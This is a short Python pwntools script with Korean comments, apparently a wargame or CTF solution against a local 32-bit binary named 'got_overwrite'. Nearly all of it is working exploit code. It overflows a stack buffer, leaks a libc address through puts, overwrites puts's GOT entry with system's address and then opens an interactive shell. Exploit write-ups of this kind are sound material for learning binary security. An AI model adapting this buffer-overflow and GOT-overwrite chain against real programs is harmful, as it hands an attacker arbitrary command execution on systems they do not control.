#! -*- coding:utf-8 -*-

from pwn import * 
p = process("./got_overwrite")

#문자열 입력을 받고, /bin/sh 를 출력하는 프로그램. 
#read 함수에서 총 0x49, 73바이트를 입력받는다. ret까지 거리는 0x34
#여기서 got overwrite 진행해보자. binsh 출력하는 함수가 puts니까
#puts의 got를 system함수의 주소로 덮어씌우면 될거같다. 
#순서는 read 함수로 puts함수 got에 system함수 주소를 입력받자. 
#근데 이때 system 함수 주소가 없다. libc leak 도 필요하다. 
# 첫 실행때는 puts(puts_got) 로 system 주소 leak 
# 두번째 실행때는 read(0,puts_got,4) 로 puts_got를 system으로 덮어씌우기
# 세번째 실행때는 그낭 puts가 실행되게 냅두기. 

pop3ret = 0x8048509 

puts_plt = 0x8048330
puts_got = 0x804a010
puts_offset = 0x67360

read_plt = 0x8048320
system_offset =  0x3cd10
main = 0x0804846b

payload = "a"*0x34
payload += p32(puts_plt) + p32(main) + p32(puts_got)

p.sendlineafter("me :",payload)

print p.recvline()
rcv = u32(p.recv(4))
libc = rcv-puts_offset
log.info("addr : "+hex(libc))



payload2 = "a"*0x34
payload2 += p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(4)
#바이트수 제한으로 pop3ret 가젯 대신 바로 main 호출. 
pause()
p.sendlineafter("me :",payload2)

system = libc+system_offset

p.sendline(p32(system))

p.interactive()